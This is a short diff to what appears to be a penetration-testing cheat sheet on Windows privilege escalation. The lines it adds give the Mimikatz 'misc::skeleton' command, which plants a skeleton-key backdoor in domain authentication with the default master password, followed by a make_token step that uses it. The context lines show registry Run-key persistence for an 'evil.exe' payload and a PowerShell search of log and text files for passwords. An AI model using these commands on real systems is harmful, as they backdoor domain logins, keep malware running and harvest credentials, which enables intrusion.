@@ -177,6 +177,10 @@ PrivEsc
       sc start evilsvc
     reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 1 /d "C:\temp\evil.exe|dll"
     
+    # Mimikatz Skeleton Key (default master password is mimikatz)
+      mimikatz misc::skeleton
+        - Once done; make_token dom\username mimikatz
+    
   Powershell Search
     Find files with passwords in contencts of TXT and LOG Files
       ls -r -d 2 -i *.txt,*.log c:\path | sls -patt 'pass' | select Line, Path (or Out-File ./file.txt)
